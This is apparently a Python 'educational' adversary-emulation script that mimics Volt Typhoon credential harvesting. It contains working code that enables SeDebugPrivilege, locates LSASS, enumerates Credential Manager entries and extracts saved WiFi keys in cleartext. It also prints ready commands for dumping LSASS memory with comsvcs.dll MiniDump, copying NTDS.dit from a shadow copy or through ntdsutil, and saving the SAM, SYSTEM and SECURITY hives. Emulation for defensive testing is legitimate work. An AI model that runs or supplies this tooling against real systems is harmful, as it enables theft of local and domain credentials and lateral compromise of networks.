# Volt Typhoon Credential Harvesting Module
# Demonstrates LSASS memory dumping and NTDS.dit extraction via native tools
# MITRE ATT&CK: T1003.001 (LSASS Memory), T1003.003 (NTDS), T1003.002 (SAM)

# For educational and research purposes only
# Author: Nour A
# Reference: https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon/

import subprocess
import os
import sys
import ctypes
import struct
import tempfile
import hashlib
from ctypes import wintypes

# -- Windows API constants for MiniDump --

PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010
MiniDumpWithFullMemory = 0x00000002

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)


class LUID(ctypes.Structure):
    _fields_ = [
        ("LowPart", wintypes.DWORD),
        ("HighPart", wintypes.LONG),
    ]


class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("Luid", LUID),
        ("Attributes", wintypes.DWORD),
    ]


class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [
        ("PrivilegeCount", wintypes.DWORD),
        ("Privileges", LUID_AND_ATTRIBUTES * 1),
    ]


def enable_debug_privilege():
    """Enable SeDebugPrivilege - required for LSASS access.
    Volt Typhoon uses this to dump credentials from protected processes.
    """
    SE_DEBUG_NAME = "SeDebugPrivilege"
    TOKEN_ADJUST_PRIVILEGES = 0x0020
    TOKEN_QUERY = 0x0008
    SE_PRIVILEGE_ENABLED = 0x00000002

    token_handle = wintypes.HANDLE()

    # open process token
    if not advapi32.OpenProcessToken(
        kernel32.GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        ctypes.byref(token_handle)
    ):
        return False

    # lookup privilege LUID
    luid = LUID()
    if not advapi32.LookupPrivilegeValueW(
        None, SE_DEBUG_NAME, ctypes.byref(luid)
    ):
        kernel32.CloseHandle(token_handle)
        return False

    # enable the privilege
    tp = TOKEN_PRIVILEGES()
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

    result = advapi32.AdjustTokenPrivileges(
        token_handle, False, ctypes.byref(tp),
        ctypes.sizeof(tp), None, None
    )
    kernel32.CloseHandle(token_handle)

    return result != 0


def find_lsass_pid():
    """Locate lsass.exe PID via CreateToolhelp32Snapshot.
    This is the same technique used by Volt Typhoon before minidump.
    """
    TH32CS_SNAPPROCESS = 0x00000002

    class PROCESSENTRY32(ctypes.Structure):
        _fields_ = [
            ("dwSize", wintypes.DWORD),
            ("cntUsage", wintypes.DWORD),
            ("th32ProcessID", wintypes.DWORD),
            ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
            ("th32ModuleID", wintypes.DWORD),
            ("cntThreads", wintypes.DWORD),
            ("th32ParentProcessID", wintypes.DWORD),
            ("pcPriClassBase", wintypes.LONG),
            ("dwFlags", wintypes.DWORD),
            ("szExeFile", ctypes.c_char * 260),
        ]

    snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snapshot == -1:
        return None

    entry = PROCESSENTRY32()
    entry.dwSize = ctypes.sizeof(PROCESSENTRY32)

    if kernel32.Process32First(snapshot, ctypes.byref(entry)):
        while True:
            name = entry.szExeFile.decode("utf-8", errors="ignore").lower()
            if name == "lsass.exe":
                pid = entry.th32ProcessID
                kernel32.CloseHandle(snapshot)
                return pid
            if not kernel32.Process32Next(snapshot, ctypes.byref(entry)):
                break

    kernel32.CloseHandle(snapshot)
    return None


def comsvcs_minidump(pid, output_path):
    """T1003.001 - Dump LSASS via comsvcs.dll MiniDump.
    This is the exact technique Volt Typhoon uses:
      rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> <path> full
    """
    cmd = f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump {pid} {output_path} full'
    print(f"  [+] Executing: {cmd}")
    # NOTE: In a real engagement this would execute. Printing command only.
    print(f"  [!] DRY RUN - Command logged but not executed for safety")
    return cmd


def ntdsutil_snapshot():
    """T1003.003 - Extract NTDS.dit via ntdsutil.exe snapshot.
    Volt Typhoon creates a volume shadow copy then copies ntds.dit.
    """
    commands = [
        # Create shadow copy of the system drive
        'vssadmin create shadow /for=C:',
        # Extract ntds.dit from shadow copy
        'copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit',
        # Extract SYSTEM hive for decryption keys
        'reg save HKLM\\SYSTEM C:\\temp\\system.hiv',
        # Clean up shadow copy
        'vssadmin delete shadows /shadow={shadow_id} /quiet'
    ]

    print("  [+] NTDS.dit Extraction Chain:")
    for i, cmd in enumerate(commands, 1):
        print(f"      Step {i}: {cmd}")

    # ntdsutil alternative method
    ntdsutil_cmds = [
        'ntdsutil "activate instance ntds" "ifm" "create full C:\\temp\\ntds_extract" quit quit'
    ]
    print("\n  [+] Alternative via ntdsutil IFM:")
    for cmd in ntdsutil_cmds:
        print(f"      {cmd}")

    print("  [!] DRY RUN - Commands logged but not executed for safety")
    return commands


def sam_registry_extraction():
    """T1003.002 - Extract SAM/SYSTEM/SECURITY registry hives.
    Used for offline credential extraction with tools like secretsdump.
    """
    hives = {
        "SAM": "HKLM\\SAM",
        "SYSTEM": "HKLM\\SYSTEM",
        "SECURITY": "HKLM\\SECURITY"
    }

    commands = []
    for name, path in hives.items():
        output = os.path.join(tempfile.gettempdir(), f"{name}.hiv")
        cmd = f'reg save {path} {output} /y'
        commands.append(cmd)
        print(f"  [+] {name}: {cmd}")

    print("  [!] DRY RUN - Commands logged but not executed for safety")
    return commands


def check_admin():
    """Check if running with admin privileges (required for credential access)"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def enumerate_cached_credentials():
    """Enumerate credential manager entries via cmdkey"""
    try:
        proc = subprocess.run(
            ["cmdkey", "/list"],
            capture_output=True, text=True, timeout=10
        )
        creds = []
        current = {}
        for line in proc.stdout.splitlines():
            line = line.strip()
            if "Target:" in line:
                if current:
                    creds.append(current)
                current = {"target": line.split(":", 1)[-1].strip()}
            elif "Type:" in line:
                current["type"] = line.split(":", 1)[-1].strip()
            elif "User:" in line:
                current["user"] = line.split(":", 1)[-1].strip()
        if current:
            creds.append(current)
        return creds
    except Exception as e:
        return [{"error": str(e)}]


def enumerate_wifi_profiles():
    """Extract saved WiFi profiles and keys"""
    profiles = []
    try:
        proc = subprocess.run(
            ["netsh", "wlan", "show", "profiles"],
            capture_output=True, text=True, timeout=10
        )
        for line in proc.stdout.splitlines():
            if "All User Profile" in line:
                name = line.split(":", 1)[-1].strip()
                # get key for each profile
                key_proc = subprocess.run(
                    ["netsh", "wlan", "show", "profile",
                     f"name={name}", "key=clear"],
                    capture_output=True, text=True, timeout=10
                )
                key = ""
                for kline in key_proc.stdout.splitlines():
                    if "Key Content" in kline:
                        key = kline.split(":", 1)[-1].strip()
                        break
                profiles.append({"ssid": name, "key": key if key else "[OPEN/ENTERPRISE]"})
    except Exception:
        pass
    return profiles


def main():
    print("=" * 70)
    print("VOLT TYPHOON CREDENTIAL HARVESTER")
    print("Native Tool Credential Extraction Demonstration")
    print("=" * 70)
    print()
    print("[!] FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY")
    print()

    # Check privileges
    is_admin = check_admin()
    print(f"[*] Running as admin: {is_admin}")
    if not is_admin:
        print("[!] WARNING: Many techniques require admin/SYSTEM privileges")
    print()

    # Stage 1: Enable debug privilege
    print("[STAGE 1] Enabling SeDebugPrivilege")
    print("-" * 50)
    result = enable_debug_privilege()
    print(f"  SeDebugPrivilege: {'Enabled' if result else 'Failed (need admin)'}")
    print()

    # Stage 2: Locate LSASS
    print("[STAGE 2] Locating LSASS Process (T1003.001)")
    print("-" * 50)
    lsass_pid = find_lsass_pid()
    if lsass_pid:
        print(f"  lsass.exe PID: {lsass_pid}")
    else:
        print("  lsass.exe not found (may need elevated access)")
    print()

    # Stage 3: LSASS MiniDump via comsvcs.dll
    print("[STAGE 3] LSASS MiniDump via comsvcs.dll (T1003.001)")
    print("-" * 50)
    if lsass_pid:
        dump_path = os.path.join(tempfile.gettempdir(), "debug.dmp")
        comsvcs_minidump(lsass_pid, dump_path)
    print()

    # Stage 4: NTDS.dit extraction
    print("[STAGE 4] NTDS.dit Extraction (T1003.003)")
    print("-" * 50)
    ntdsutil_snapshot()
    print()

    # Stage 5: SAM hive extraction
    print("[STAGE 5] Registry Hive Extraction (T1003.002)")
    print("-" * 50)
    sam_registry_extraction()
    print()

    # Stage 6: Cached credentials
    print("[STAGE 6] Cached Credential Enumeration")
    print("-" * 50)
    creds = enumerate_cached_credentials()
    for c in creds:
        if "target" in c:
            print(f"  Target: {c['target']}")
            if "user" in c:
                print(f"    User: {c['user']}")
    print(f"  Total cached credentials: {len(creds)}")
    print()

    # Stage 7: WiFi profiles
    print("[STAGE 7] WiFi Profile Extraction")
    print("-" * 50)
    wifi = enumerate_wifi_profiles()
    for w in wifi:
        print(f"  SSID: {w['ssid']} | Key: {w['key']}")
    print()

    print("=" * 70)
    print("[+] CREDENTIAL HARVESTING DEMONSTRATION COMPLETE")
    print("  Key TTPs: comsvcs.dll MiniDump, NTDS.dit via VSS,")
    print("  SAM/SYSTEM/SECURITY hive extraction, cached creds")
    print("=" * 70)


if __name__ == "__main__":
    main()
